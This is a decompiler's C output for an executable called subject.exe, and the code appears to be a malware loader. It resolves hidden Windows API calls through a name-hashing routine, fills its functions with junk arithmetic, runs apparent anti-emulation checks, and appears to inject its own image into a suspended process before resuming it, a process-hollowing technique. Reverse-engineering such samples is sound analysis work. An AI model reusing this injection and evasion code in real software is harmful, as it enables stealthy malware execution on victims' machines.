// subject_UPX0.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: void fn00401000()
// Called from:
//      fn004017DD
void fn00401000()
{
	ptr32 fp;
	ui32 dwLoc08;
	ui32 dwLoc10;
	ui32 dwLoc0C;
	GetModuleFileNameA(null, &g_t4041B0, 0x0104);
	ui32 ecx_41 = dwLoc08 * 0x03 + 0x0BE6;
	ui32 edx_43 = dwLoc08 * 0x04 + 8138 << (byte) ecx_41;
	ui32 eax_28 = dwLoc08 * 0x02 + 70 & dwLoc0C * 0x08 + 4998 ^ dwLoc08 + 991 >> (byte) dwLoc10 + ~0x51;
	ui32 eax_45 = dwLoc08 * 0x02 & edx_43;
	struct Eq_48 * esp_55;
	g_ptr4043B8();
	esp_55->dwFFFFFFFC = g_dw404054;
	esp_55->dwFFFFFFF8 = 0x004042B4;
	ui32 edx_65 = dwLoc10 * 0x08 + 8811 << (byte) dwLoc10 * 0x02 + 0x4B;
	ui32 eax_71 = dwLoc10 - eax_28 * 0x04 + 3665 ^ edx_65;
	struct Eq_78 * esp_81;
	g_ptr4043BC();
	esp_81->dwFFFFFFFC = g_dw40404C;
	esp_81->dwFFFFFFF8 = 0x004042B4;
	int32 ecx_90 = eax_71 * 0x08 + 0x04E5;
	ui32 eax_96 = eax_71 * 0x02 + 4661 ^ (eax_28 + 5593) *s ecx_90 | eax_45 + 0x1061;
	struct Eq_107 * esp_106;
	g_ptr4043BC();
	esp_106->dwFFFFFFFC = g_dw404030;
	esp_106->dwFFFFFFF8 = 0x004042B4;
	ui32 edx_125 = (eax_45 << 0x03) + 0x181B;
	ui32 eax_126 = -(eax_96 * 0x02) + (eax_45 << 0x03) + 6922 >> (byte) eax_45 * 0x02 ^ edx_125;
	struct Eq_136 * esp_136;
	g_ptr4043BC();
	esp_136->dwFFFFFFFC = 0x004041B0;
	esp_136->dwFFFFFFF8 = 0x004042B4;
	struct Eq_146 * esp_149;
	g_ptr4043BC();
	g_dw4043C0 = 0x44;
	g_dw4043EC = 0x01;
	g_w4043F0 = 0x02;
	ui32 eax_174 = -(eax_96 + 0x0A06) + (eax_126 << 0x04) & (eax_126 << 0x02) + 343;
	esp_149->dwFFFFFFFC = 0x00404404;
	esp_149->dwFFFFFFF8 = 0x004043C0;
	esp_149->dwFFFFFFF4 = 0x00;
	esp_149->dwFFFFFFF0 = 0x00;
	esp_149->dwFFFFFFEC = 0x04;
	esp_149->dwFFFFFFE8 = 0x00;
	esp_149->dwFFFFFFE4 = 0x00;
	esp_149->dwFFFFFFE0 = 0x00;
	esp_149->dwFFFFFFDC = 0x004042B4;
	esp_149->dwFFFFFFD8 = 0x00;
	ui32 eax_186 = 0x00 >> ((byte) eax_126 << 0x02) + ~0x52 & (eax_174 + 0x0F0F) + (eax_126 << 0x02) * 0x02;
	ui32 eax_198 = (eax_126 << 0x02) * 0x02 << (byte) eax_174 * 0x02 & eax_186 * 0x02;
	struct Eq_235 * esp_223;
	g_ptr404414();
	esp_223->tFFFFFFFC.u0 = 0x00;
	ui32 ecx_269 = eax_198 * 0x08 + 9822;
	Eq_8 eax_234 = GetModuleHandleA(esp_223->tFFFFFFFC);
	word32 eax_262 = eax_234 + Mem260[eax_234 + 60:word32];
	esp_223->tFFFFFFFC.u0 = 0x40;
	esp_223->dwFFFFFFF8 = 0x3000;
	esp_223->dwFFFFFFF4 = (int32) eax_262[20];
	esp_223->tFFFFFFF0 = eax_234;
	esp_223->dwFFFFFFEC = g_dw404404;
	ui32 edx_270 = (eax_186 << 0x03) + eax_186 * 0x04 + ecx_269;
	ui32 eax_272 = eax_186 * 0x02 ^ edx_270;
	struct Eq_293 * esp_289;
	word32 eax_290;
	g_ptr404418();
	esp_289->ptrFFFFFFFC = fp - 20;
	esp_289->dwFFFFFFF8 = (int32) eax_262[20];
	esp_289->tFFFFFFF4 = eax_234;
	esp_289->dwFFFFFFF0 = eax_290;
	esp_289->dwFFFFFFEC = g_dw404404;
	ui32 ecx_304 = eax_272 * 0x04 + 0x019D;
	struct Eq_323 * esp_326;
	g_ptr40441C();
	g_dw404420 = 0x00010007;
	ui32 eax_341 = eax_272 + 5008 ^ eax_272 * 0x02 | eax_272 * 0x02 + 45 >> ((byte) eax_272 + 0xAC | 0x00 << (byte) ecx_304) + 0x5D;
	esp_326->dwFFFFFFFC = 0x00404420;
	esp_326->dwFFFFFFF8 = g_dw404408;
	int32 ecx_348 = (eax_341 << 0x03) *s (eax_341 * 0x02);
	ui32 eax_350 = eax_341 + ecx_348 - eax_341 * 0x02;
	struct Eq_368 * esp_359;
	g_ptr4046EC();
	g_dw4044D8 = 4199311;
	esp_359->dwFFFFFFFC = 0x00404420;
	esp_359->dwFFFFFFF8 = g_dw404408;
	struct Eq_382 * esp_387;
	g_ptr4046F0();
	ui32 ecx_396 = eax_350 + 0x016C + eax_272;
	esp_387->dwFFFFFFFC = g_dw404408;
	ui32 edx_399 = 0x00 << (byte) ecx_396 + ~0x62;
	g_ptr4046F4();
}

// 004017DD: void fn004017DD()
void fn004017DD()
{
	Eq_401 tLoc30;
	ui32 dwLoc08;
	ui32 dwLoc0C;
	ui32 dwLoc10;
	lstrcpyA(&tLoc30, g_t404050.u0);
	Eq_8 eax_26 = LoadLibraryA(&tLoc30);
	Eq_8 ebx_28 = eax_26;
	if (eax_26 == null)
	{
		lstrcatA(&tLoc30, g_t404048.u0);
		LoadLibraryA(&tLoc30);
		lstrcatA(&tLoc30, g_t404000.u0);
		ebx_28 = LoadLibraryA(&tLoc30);
	}
	g_ptr404414 = fn00401DDC(ebx_28, 112232641);
	g_ptr404418 = fn00401DDC(ebx_28, ~0x25C1455F);
	g_ptr40441C = fn00401DDC(ebx_28, 0xD17F004B);
	ui32 eax_70 = dwLoc08 + 0x25A3 | (dwLoc0C * 0x02) *s (dwLoc0C * 0x02) >> (byte) dwLoc08 * 0x02;
	g_ptr4046EC = fn00401DDC(ebx_28, 3936116561);
	int32 eax_130 = dwLoc08 - dwLoc10 * 0x04 + 0x0C62 ^ (eax_70 * 0x02 + 36 >> ((byte) eax_70 * 0x02 + 0x67) + (byte) dwLoc10 ^ dwLoc10 * 0x08 + 8528) * 0x02;
	g_ptr4046F0 = fn00401DDC(ebx_28, ~0x156388AE);
	g_ptr4046F4 = fn00401DDC(ebx_28, 3471424831);
	g_ptr404D0C = fn00401DDC(ebx_28, 220773272);
	ui32 eax_157 = dwLoc08 * 0x02 ^ ((eax_130 << 0x02) + eax_130 * 0x08) - (dwLoc08 + 1132);
	g_ptr404D10 = fn00401DDC(ebx_28, 553314589);
	ui32 eax_218 = (eax_157 * 0x02 *s eax_130 * 0x04 | (eax_157 << 0x03) *s (eax_130 + 0x1016)) * 0x02 << ((byte) eax_157 * 0x02) *s (((byte) eax_157 << 0x03) + 0x1B) & (eax_157 << 0x03) + 8557;
	g_ptr4046F8 = fn00401DDC(ebx_28, 0x7DCD8222);
	g_ptr4043BC = fn00401DDC(ebx_28, 3351994445);
	ui32 eax_273 = eax_218 * 0x05 + 0x35E2 & dwLoc08 + 0x0566 << (byte) eax_218 * 0x02 + 0x68;
	ui32 eax_248 = 0x00 << ((byte) (-(eax_157 * 0x02)) + ((byte) eax_157 << 0x03)) + ~0x48;
	g_ptr4043B8 = fn00401DDC(ebx_28, ~0x3830D932);
	ui32 eax_322 = eax_248 * 0x02 + 0xA9 << (((byte) eax_273 * 0x04 + 0x4F << (byte) eax_273 * 0x02) + (byte) dwLoc08) * 0x08 + ~0x01;
	g_ptr404D14 = fn00401DDC(ebx_28, 3324669261);
	ui32 eax_346 = eax_248 << 0x03 & eax_248 * 0x02 + 0x0DA8 | (eax_248 * 0x02 + 0x96) + eax_322 * 0x08;
	g_ptr404700 = fn00401DDC(ebx_28, ~0x29B12251);
	g_ptr4046FC = fn00401DDC(ebx_28, 1054485158);
	g_ptr404704 = fn00401DDC(ebx_28, 882520795);
	g_ptr404D18 = fn00401DDC(ebx_28, 0xBD923310);
	g_ptr404D1C = fn00401DDC(ebx_28, 3126133864);
	int32 eax_372 = (eax_346 * 0x02 + 0x0068) *s (eax_322 + 0x1950) + (eax_346 + eax_322) * 0x02;
	g_ptr404D20 = fn00401DDC(ebx_28, 3344200401);
	ui32 eax_399 = -(eax_372 * 0x02 + 9109) + eax_322 * 0x02 & eax_372 * 0x02 + 0x006D << (byte) eax_322 + 0x03;
	ui32 eax_517 = eax_399 * 0x02 + 0xCB;
	struct Eq_683 * esp_540;
	g_ptr4043B8();
	esp_540->dwFFFFFFFC = g_dw404058;
	esp_540->ptrFFFFFFF8 = &tLoc30;
	uint32 edx_551 = eax_322 * 0x04 + 0x2153 >> (byte) eax_399 * 0x02 + 220;
	struct Eq_705 * esp_568;
	g_ptr4043BC();
	esp_568->dwFFFFFFFC = g_dw404040;
	esp_568->ptrFFFFFFF8 = &tLoc30;
	struct Eq_716 * esp_589;
	g_ptr4043BC();
	ui32 eax_557 = eax_322 + 0x2599 << (byte) eax_517 + 0x0A | edx_551;
	uint32 eax_580 = eax_399 * 0x02 >> (byte) eax_517 * 0x02;
	esp_589->dwFFFFFFFC = g_dw404004;
	esp_589->ptrFFFFFFF8 = &tLoc30;
	uint32 ecx_597 = eax_580 + 0x3345 + eax_557 * 0x02;
	struct Eq_748 * esp_612;
	g_ptr4043BC();
	esp_612->ptrFFFFFFFC = &tLoc30;
	ui32 eax_601 = eax_557 - eax_580 * 0x02 + 0x0DB8 ^ ecx_597;
	struct Eq_761 * esp_634;
	Eq_8 eax_635;
	g_ptr4046F8();
	esp_634->dwFFFFFFFC = ~0x00316CCF;
	esp_634->tFFFFFFF8 = eax_635;
	g_ptr404D24 = fn00401DDC(esp_634->tFFFFFFF8, esp_634->dwFFFFFFFC);
	ui32 eax_626 = eax_557 * 0x02 - eax_399 * 0x02 | eax_601 * 0x04;
	esp_634->dwFFFFFFFC = ~0x4727C02C;
	esp_634->tFFFFFFF8 = eax_635;
	g_ptr404D28 = fn00401DDC(esp_634->tFFFFFFF8, esp_634->dwFFFFFFFC);
	ui32 eax_649 = (eax_557 + 0x0922) *s (eax_557 * 0x08 + 8998) | eax_626 * 0x02 ^ eax_557 * 0x02;
	esp_634->dwFFFFFFFC = 0xF8FC0218;
	esp_634->tFFFFFFF8 = eax_635;
	g_ptr404D2C = fn00401DDC(esp_634->tFFFFFFF8, esp_634->dwFFFFFFFC);
	esp_634->dwFFFFFFFC = 0x5AA0961C;
	esp_634->tFFFFFFF8 = eax_635;
	g_ptr404D30 = fn00401DDC(esp_634->tFFFFFFF8, esp_634->dwFFFFFFFC);
	ui32 eax_682 = eax_626 * 0x02 << (byte) eax_649 + 166 | eax_649 * 0x02 >> (byte) eax_399 * 0x04;
	esp_634->dwFFFFFFFC = 0x9CCB4465;
	esp_634->tFFFFFFF8 = eax_635;
	g_ptr404D34 = fn00401DDC(esp_634->tFFFFFFF8, esp_634->dwFFFFFFFC);
	uint32 eax_743 = eax_649 << 0x02 >> ((byte) eax_682 + 0xA8) + ((byte) eax_682 * 0x02 + 0x54) *s ((byte) eax_682 * 0x02 + ~0x0C) << 0x03 << (byte) eax_682 * 0x04 + ~0x60 >> (byte) (-(eax_682 << 0x03)) + 0x05;
	ui32 eax_770 = eax_743 * 0x04 + 1601 ^ (eax_743 * 0x02 + 0x1565 >> (byte) eax_682 + 0x3D ^ eax_626 * 0x02 + 0x0069);
	esp_634->dwFFFFFFFC = g_dw404028;
	ui32 edx_791 = eax_770 * 0x02 + 0x131C;
	ui32 eax_797 = eax_770 * 0x02 >> (byte) eax_743 * 0x04 & edx_791;
	struct Eq_956 * esp_805;
	Eq_8 eax_806;
	g_ptr4046F8();
	esp_805->dwFFFFFFFC = 3884632733;
	esp_805->tFFFFFFF8 = eax_806;
	g_ptr404D38 = fn00401DDC(esp_805->tFFFFFFF8, esp_805->dwFFFFFFFC);
	fn00401000();
	ui32 eax_818 = -(eax_797 + 0x0660) + eax_797 * 0x02 & eax_797 * 0x02 + 202;
	esp_805->dwFFFFFFFC = 0x00;
	ui32 ecx_871 = (eax_818 * 0x08 + 0x2163 & eax_770 * 0x04 - eax_818 * 0x02 >> (byte) eax_797 * 0x02) * 0x02 + 0x006D;
	uint32 edx_868 = eax_770 * 0x02 + 0xD0 >> (byte) eax_797 * 0x08 + 0x5F;
	g_ptr404D10();
}

// 00401DDC: Register word32 fn00401DDC(Stack Eq_8 dwArg04, Stack uint32 dwArg08)
// Called from:
//      fn004017DD
word32 fn00401DDC(Eq_8 dwArg04, uint32 dwArg08)
{
	ptr32 fp;
	struct Eq_1053 * fs;
	ptr32 v6_15 = fs->ptr0000;
	fs->ptr0000 = fp - 20;
	word32 eax_72 = Mem69[Mem52[dwArg04 + 60:word32] + dwArg04 + 0x0078:word32] + dwArg04;
	word16 eax_76[] = dwArg04 + eax_72->dw0024 / 4;
	if (SetFileSecurityA(0x00, 0x00, null) != 0x00)
		dwArg08 += 44495;
	if (SetFileSecurityA(666, 0x00, null) == 0x00)
		dwArg08 += 916656;
	word32 eax_129[] = dwArg04 + eax_72->dw0020 / 4;
	word32 eax_134[] = dwArg04 + eax_72->dw001C / 4;
	int32 esi_136 = 0x00;
	while (true)
	{
		word32 eax_224;
		if (esi_136 >= eax_72->dw0018)
			break;
		uint32 eax_147 = 0x00;
		int32 ecx_161 = dwArg04 + eax_129[esi_136] / 4;
		byte dwLoc3C_300[] = null;
		while (dwLoc3C_300[ecx_161] != 0x00)
		{
			eax_147 = (eax_147 << 0x07 | eax_147 >> 0x19) ^ ((int32) dwLoc3C_300[ecx_161] ^ 0x5E);
			dwLoc3C_300 = (byte (*)[]) (dwLoc3C_300 + 1);
		}
		if (eax_147 == dwArg08)
		{
			eax_224 = dwArg04 + eax_134[(word32) eax_76[esi_136]] / 4;
			goto l00401FC6;
		}
		++esi_136;
	}
	eax_224 = 0x00;
l00401FC6:
	fs->ptr0000 = v6_15;
	return eax_224;
}

CHAR g_str403012[] = "ker"; // 00403012
CHAR g_str40301B[] = "ne"; // 0040301B
CHAR g_str4030FA[] = "l32.dll"; // 004030FA
Eq_238 g_t404000 = // 00404000
	{
		&g_str4030FA
	};
word32 g_dw404004 = 0x004030F6; // 00404004
uint32 g_dw404028 = 0x00403033; // 00404028
word32 g_dw404030 = 0x0040302B; // 00404030
word32 g_dw404040 = 0x00403020; // 00404040
Eq_238 g_t404048 = // 00404048
	{
		&g_str40301B
	};
word32 g_dw40404C = 0x00403016; // 0040404C
Eq_238 g_t404050 = // 00404050
	{
		&g_str403012
	};
word32 g_dw404054 = 0x0040300F; // 00404054
word32 g_dw404058 = 0x0040300C; // 00404058
CHAR g_t4041B0 = '\0'; // 004041B0
<anonymous> * g_ptr4043B8 = null; // 004043B8
<anonymous> * g_ptr4043BC = null; // 004043BC
word32 g_dw4043C0 = 0x00; // 004043C0
word32 g_dw4043EC = 0x00; // 004043EC
word16 g_w4043F0 = 0x00; // 004043F0
word32 g_dw404404 = 0x00; // 00404404
word32 g_dw404408 = 0x00; // 00404408
<anonymous> * g_ptr404414 = null; // 00404414
<anonymous> * g_ptr404418 = null; // 00404418
<anonymous> * g_ptr40441C = null; // 0040441C
word32 g_dw404420 = 0x00; // 00404420
word32 g_dw4044D8 = 0x00; // 004044D8
<anonymous> * g_ptr4046EC = null; // 004046EC
<anonymous> * g_ptr4046F0 = null; // 004046F0
<anonymous> * g_ptr4046F4 = null; // 004046F4
<anonymous> * g_ptr4046F8 = null; // 004046F8
<anonymous> * g_ptr4046FC = null; // 004046FC
<anonymous> * g_ptr404700 = null; // 00404700
<anonymous> * g_ptr404704 = null; // 00404704
<anonymous> * g_ptr404D0C = null; // 00404D0C
<anonymous> * g_ptr404D10 = null; // 00404D10
<anonymous> * g_ptr404D14 = null; // 00404D14
<anonymous> * g_ptr404D18 = null; // 00404D18
<anonymous> * g_ptr404D1C = null; // 00404D1C
<anonymous> * g_ptr404D20 = null; // 00404D20
<anonymous> * g_ptr404D24 = null; // 00404D24
<anonymous> * g_ptr404D28 = null; // 00404D28
<anonymous> * g_ptr404D2C = null; // 00404D2C
<anonymous> * g_ptr404D30 = null; // 00404D30
<anonymous> * g_ptr404D34 = null; // 00404D34
<anonymous> * g_ptr404D38 = null; // 00404D38
